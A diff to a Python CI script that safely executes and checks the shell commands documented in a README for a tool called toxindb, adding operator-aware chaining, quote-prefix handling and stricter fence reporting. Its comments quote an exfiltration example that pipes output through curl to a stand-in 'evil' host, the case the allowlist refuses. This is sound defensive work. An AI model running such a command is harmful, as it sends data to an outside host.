@@ -61,17 +61,14 @@ from pathlib import Path
 # `toxindb demo | curl ...` line would have been executed, breaking the offline
 # promise this project makes. Here anything unrecognised is skipped, and says so.
 #
-# These patterns are matched against the *unwrapped* argv vector, not the raw
-# line, so a documented `env PYTHONHASHSEED=0 toxindb demo` is recognised. They
-# used to be anchored at the start of the string, which meant `env toxindb
-# demo`, `nohup toxindb ...`, `timeout 5 toxindb ...` and `FOO=bar toxindb ...`
-# all failed to match, were reported as "not a toxindb command", and the gate
-# exited 0 with those commands unverified. That is a silent skip of exactly the
-# kind this file exists to avoid.
-RUNNABLE_STEPS: tuple[str, ...] = (
-    "toxindb",
-    r"python[0-9.]*",
-)
+# The test is `_is_toxindb_invocation`, applied to the *unwrapped* argv vector.
+# A named tuple of runnable prefixes used to sit here and nothing matched
+# against it: the patterns were anchored at the start of the string, so
+# `env toxindb ...`, `nohup toxindb ...`, `timeout 5 toxindb ...` and
+# `FOO=bar toxindb ...` all failed to match, were reported as "not a toxindb
+# command", and the gate exited 0 with those commands unverified. That is a
+# silent skip of exactly the kind this file exists to avoid, so the constant was
+# removed rather than left in place for the next reader to trust.
 
 # Wrappers that put the real command somewhere other than the front of the argv.
 # Each entry is the number of *non-option* arguments the wrapper consumes before
@@ -124,7 +121,13 @@ _SHELL_SYNTAX: tuple[tuple[re.Pattern[str], str], ...] = (
     (re.compile(r"\|"), "pipeline operator"),
     (re.compile(r";"), "list operator"),
     (re.compile(r"[*?\[\]]"), "glob"),
-    (re.compile(r"[~!#{}()]"), "shell metacharacter"),
+    (re.compile(r"[~!{}()]"), "shell metacharacter"),
+    # `#` only, and only where it can actually open a comment: at the start of a
+    # word. It was in the character class above, which refused
+    # `toxindb report runs#3.jsonl` -- a perfectly legal filename that a shell
+    # also passes through untouched. A false refusal costs a real command its
+    # check, and it is invisible: the line is reported as skipped, not failed.
+    (re.compile(r"(?:(?<=\s)|^)#"), "comment operator"),
 )
 
 # Steps that only prepare the shell; they carry no assertion about toxindb and
@@ -205,11 +208,23 @@ def strip_inline_comment(line: str) -> str:
     return "".join(out).strip()
 
 
-def split_steps(command: str) -> list[str]:
-    """Split a command on shell chaining, respecting simple quoting."""
-    steps: list[str] = []
+def split_steps(command: str) -> list[tuple[str, str]]:
+    """Split a command on shell chaining, respecting simple quoting.
+
+    Returns ``(joiner, step)`` pairs. `joiner` is the operator that placed this
+    step after the previous one, and is ``""`` for the first.
+
+    The operator is carried rather than discarded because `&&` and `||` mean
+    opposite things, and treating them alike is not a rounding error. A
+    documented `toxindb nosuchsub || toxindb --version` runs the second command
+    only if the first *fails*, so the line succeeds; running it as `&&` stops at
+    the failure and reports a correct line as broken, which is the kind of false
+    failure that teaches a maintainer to ignore this job.
+    """
+    steps: list[tuple[str, str]] = []
     current: list[str] = []
     quote: str | None = None
+    joiner = ""
     i = 0
     while i < len(command):
         ch = command[i]
@@ -230,19 +245,19 @@ def split_steps(command: str) -> list[str]:
         # operators, so `cmd; other` and `cmd | head` were never split at all
         # and each was judged as a single step.
         if command[i:i + 2] in ("&&", "||"):
-            steps.append("".join(current).strip())
-            current = []
+            steps.append((joiner, "".join(current).strip()))
+            joiner, current = command[i:i + 2], []
             i += 2
             continue
         if ch in ";|\n":
-            steps.append("".join(current).strip())
-            current = []
+            steps.append((joiner, "".join(current).strip()))
+            joiner, current = ";", []
             i += 1
             continue
         current.append(ch)
         i += 1
-    steps.append("".join(current).strip())
-    return [step for step in steps if step]
+    steps.append((joiner, "".join(current).strip()))
+    return [(j, s) for j, s in steps if s]
 
 
 _ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
@@ -340,22 +355,23 @@ def plan_command(
 ) -> tuple[list[list[str]] | None, dict[str, str], str | None]:
     """Turn a documented line into argv vectors, or explain why it is skipped.
 
-    Returns ``(steps, assignments, reason)``. ``steps`` holds one argv vector per
-    payload step -- a line like ``toxindb demo && toxindb monitor x`` is two
-    commands, not one, and concatenating them would run neither. Exactly one of
-    ``steps`` and ``reason`` is None.
+    Returns ``(steps, assignments, reason)``. ``steps`` holds one ``(joiner,
+    argv)`` pair per payload step -- a line like ``toxindb demo && toxindb
+    monitor x`` is two commands, not one, and concatenating them would run
+    neither -- and the joiner is what tells the executor whether to run the next
+    one after this one fails. Exactly one of ``steps`` and ``reason`` is None.
     """
     steps = split_steps(command)
     if not steps:
         return None, {}, "blank"
-    if all(step.startswith("#") for step in steps):
+    if all(step.startswith("#") for _, step in steps):
         return None, {}, "comment only"
 
-    payload = [step for step in steps if not SETUP_STEPS.match(step)]
+    payload = [(joiner, step) for joiner, step in steps if not SETUP_STEPS.match(step)]
     if not payload:
         return None, {}, "shell setup only, nothing to check"
 
-    for step in payload:
+    for _, step in payload:
         for pattern, reason in UNSAFE_STEPS:
             if pattern.search(step):
                 return None, {}, reason
@@ -364,9 +380,9 @@ def plan_command(
     # invocation; anything this gate does not recognise is skipped and says so.
     # With a denylist, a documented `toxindb demo | curl -T - https://evil`
     # would run, because no rule matched the piped stage.
-    planned: list[list[str]] = []
+    planned: list[tuple[str, list[str]]] = []
     assignments: dict[str, str] = {}
-    for step in payload:
+    for joiner, step in payload:
         syntax = shell_syntax_reason(step)
         if syntax is not None:
             return None, {}, syntax
@@ -385,7 +401,7 @@ def plan_command(
         if not _is_toxindb_invocation(argv):
             return None, {}, "not a toxindb command"
         assignments.update(step_assignments)
-        planned.append(argv)
+        planned.append((joiner, argv))
     if not planned:
         return None, {}, "blank"
     return planned, assignments, None
@@ -492,11 +508,27 @@ def _tree_state(root: Path) -> str | None:
     # `!! toxindb/__pycache__/` and nothing else. Narrow by design: only
     # `__pycache__` directories and `.pyc` files, so an ignored *data* file such
     # as a planted canary is still a signal.
+    #
+    # Narrower still, on path components rather than on the substring
+    # `"__pycache__" in line`. The substring also matched any path with that
+    # text anywhere in its name -- `toxindb/report_cache.py`, a fixture called
+    # `__pycache__notes.jsonl` -- and silently removed it from the comparison,
+    # which is the exact failure the assertion exists to report.
     return "".join(
-        line
-        for line in proc.stdout.splitlines(keepends=True)
-        if "__pycache__" not in line and not line.rstrip().endswith(".pyc")
+        line for line in proc.stdout.splitlines(keepends=True)
+        if not _is_byte_code_cache(line)
     )
+
+
+def _is_byte_code_cache(line: str) -> bool:
+    """Is this `git status --porcelain` line a byte-code cache entry?
+
+    `XY PATH`, so the path starts at offset 3. A rename reads `old -> new` and
+    the new name is the one on disk.
+    """
+    entry = line[3:] if len(line) > 3 else ""
+    path = entry.split(" -> ")[-1].strip().strip('"')
+    return "__pycache__" in path.split("/") or path.endswith(".pyc")
 
 
 _FENCE = re.compile(r"^\s*(?P<ticks>`{3,}|~{3,})\s*(?P<info>.*?)\s*$")
@@ -512,6 +544,29 @@ _UNLABELLED = re.compile(r"^\s*(?P<ticks>`{3,}|~{3,})\s*$")
 
 def _is_shell_info(info: str) -> bool:
     return bool(_SHELL_WORDS.search(info.strip("{}").replace(".", " ")))
+
+
+# A block-quote marker in front of a line. CommonMark allows a fenced code
+# block inside a block quote, and `> ```bash` is a shell block a reader will
+# reasonably copy. It used to be invisible: `_FENCE` is anchored at the start of
+# the line, so the marker stopped it matching, and a `> ```bash` block holding a
+# documented bad command was never run -- silently, with no skip reason, while
+# the `ran == 0` floor stayed satisfied by whatever other block the document
+# had. Stripped rather than specially handled, which over-scans: CommonMark lazy
+# continuation and nesting are not modelled, and scanning content that a strict
+# reader would call quote text can only find a command earlier, never later.
+_QUOTE_PREFIX = re.compile(r"^ {0,3}(?:>[ \t]?)+")
+
+
+def _report_unterminated(line_no: int, message: str, sink: list[int]) -> None:
+    """Record and print an unclosed fence at `line_no`.
+
+    One place, so the three call sites cannot drift in wording or in whether they
+    print at all. They did once: the non-shell case reported the *shell* block's
+    start offset, which sent the reader to a closed, healthy fence.
+    """
+    sink.append(line_no)
+    print(f"::error::{line_no}: {message}", file=sys.stderr)
 
 
 def extract_shell_blocks(
@@ -550,17 +605,45 @@ def extract_shell_blocks(
     start = 0
     body: list[str] = []
     for number, line in enumerate(lines, 1):
+        line = _QUOTE_PREFIX.sub("", line)
         fence_match = _FENCE.match(line)
         if ignoring:
             # Inside a fence we are deliberately not reading. Only its own
-            # closing fence can end it.
+            # closing fence can end it -- and a closing fence has, by
+            # definition, no info string.
             if (
                 fence_match
                 and fence_match.group("info") == ""
                 and fence_match.group("ticks")[0] == ignoring
             ):
                 ignoring = ""
-            continue
+                continue
+            if fence_match:
+                # A fence carrying an info string cannot close the fence we are
+                # skipping, so that fence is still open. This is the silent
+                # version of the defect the check below reports: a forgotten
+                # ```python swallowed every ```bash block after it, so a
+                # documented `toxindb nosuchsubcommand` was never run, nothing
+                # was printed about it, and `main()` returned 0 -- the job green
+                # with an unverified command. Verified on a README with a
+                # healthy block at line 5 and a `python` block at line 10 whose
+                # only candidate closer was a ```bash at line 13.
+                #
+                # The report is at the fence's own line, not at whatever block
+                # happened to be scanned last, and the new fence is then opened
+                # normally so the commands after it are still checked. Resuming
+                # is deliberately more permissive than CommonMark, which would
+                # let the open fence run to the end of the document: this gate
+                # over-scans in preference to missing a command, and it has
+                # already said the structure is broken.
+                _report_unterminated(
+                    ignoring_start,
+                    f"non-shell code fence opened here is never closed",
+                    unterminated,
+                )
+                ignoring = ""
+            else:
+                continue
         if not in_block:
             if not fence_match:
                 continue
@@ -571,7 +654,8 @@ def extract_shell_blocks(
                 # An explicitly non-shell fence (python, json, text, ...).
                 # `ignoring_start` is kept because the unterminated report below
                 # names this fence's line. Reusing `start` for it pointed the
-                # error at line 0, which is not a line in the document.
+                # error at line 0, or at an unrelated block's line, neither of
+                # which is where the author has to look.
                 ignoring = fence_match.group("ticks")[0]
                 ignoring_start = number
                 continue
@@ -599,20 +683,15 @@ def extract_shell_blocks(
         # printed `::error::`, and exited 0. A gate that reports a problem and
         # then passes is worse than one that is silent, because the reader
         # learns to ignore it.
-        unterminated.append(start)
-        print(
-            f"::error::{start}: code fence opened here is never closed",
-            file=sys.stderr,
-        )
+        _report_unterminated(start, "code fence opened here is never closed", unterminated)
     if ignoring:
         # Same class of defect, in the fence we are deliberately not reading.
-        # Reported, because a `python` block left open would hide the rest of
-        # the document just as thoroughly.
-        unterminated.append(ignoring_start)
-        print(
-            f"::error::{ignoring_start}: non-shell code fence opened here is "
-            f"never closed",
-            file=sys.stderr,
+        # Reported, because a `python` block left open hides the rest of the
+        # document just as thoroughly as a `bash` block left open.
+        _report_unterminated(
+            ignoring_start,
+            "non-shell code fence opened here is never closed",
+            unterminated,
         )
     return shell_blocks, unlabelled, unterminated
 
@@ -677,18 +756,29 @@ def _main() -> int:
     markdown = args.readme.read_text(encoding="utf-8")
     blocks, unlabelled, unterminated = extract_shell_blocks(markdown)
     if unterminated:
-        # Before the "no blocks found" check, so a document that is *only* an
-        # unterminated fence is caught here too rather than reported as having
-        # no shell blocks.
+        # Reported, and the run continues. It used to return 1 here, which is
+        # safe but throws away everything else: an author with one forgotten
+        # fence gets told about the fence and nothing about the twelve commands
+        # around it. Continuing keeps the exit code non-zero -- the structural
+        # error is a verdict either way -- while still reporting which of the
+        # documented commands work.
+        #
+        # Continuing is sound because nothing unrecognised is executed: every
+        # command still has to clear the same allowlist, the same shell-syntax
+        # refusal and the same unsafe-step rules, and the working tree is still
+        # asserted before and after.
         print(
-            f"error: {len(unterminated)} code fence(s) are never closed "
-            f"(first at line {unterminated[0]}). Every command after one of "
-            f"these is invisible to this gate, so the comparison below is not "
-            f"the one the reader would expect.",
+            f"::error::{len(unterminated)} code fence(s) are never closed "
+            f"(first at line {unterminated[0]}). Anything a fence was meant to "
+            f"cover but did not is read as ordinary document text, so this "
+            f"check is not a complete comparison until the fence is fixed.",
             file=sys.stderr,
         )
-        return 1
     if not blocks:
+        if unterminated:
+            # The structural error is the diagnosis; "no bash blocks found" on
+            # top of it would send the author looking for the wrong thing.
+            return 1
         print(f"error: no ```bash blocks found in {args.readme}", file=sys.stderr)
         print("If the README lost its shell examples, delete this job instead of", file=sys.stderr)
         print("letting it pass vacuously.", file=sys.stderr)
@@ -852,7 +942,7 @@ def _main() -> int:
             if assignments:
                 step_env = dict(env, **assignments)
             rc, output = 0, ""
-            for argv in steps:
+            for position, (joiner, argv) in enumerate(steps):
                 try:
                     # No shell, and the exit status is the program's own. With
                     # `shell=True` this returned the *shell's* status, so
@@ -877,7 +967,12 @@ def _main() -> int:
                 rc = completed.returncode
                 output += completed.stdout + completed.stderr
                 if rc != 0:
-                    break
+                    # `a || b` runs b precisely because a failed, so the chain is
+                    # only over once nothing is left to try. Everything else --
+                    # `&&`, `;`, a single step -- stops here.
+                    following = steps[position + 1:position + 2]
+                    if not following or following[0][0] != "||":
+                        break
 
             # Checked per command, not only at the end. The end-of-run assertion
             # below is what fails the job; this is what names the culprit, which
@@ -952,7 +1047,7 @@ def _main() -> int:
             file=sys.stderr,
         )
         return 1
-    return 0
+    return 1 if unterminated else 0
 
 
 def main() -> int:
@@ -981,5 +1076,4 @@ def main() -> int:
 
 
 if __name__ == "__main__":
-    sys.exit(main())
     sys.exit(main())
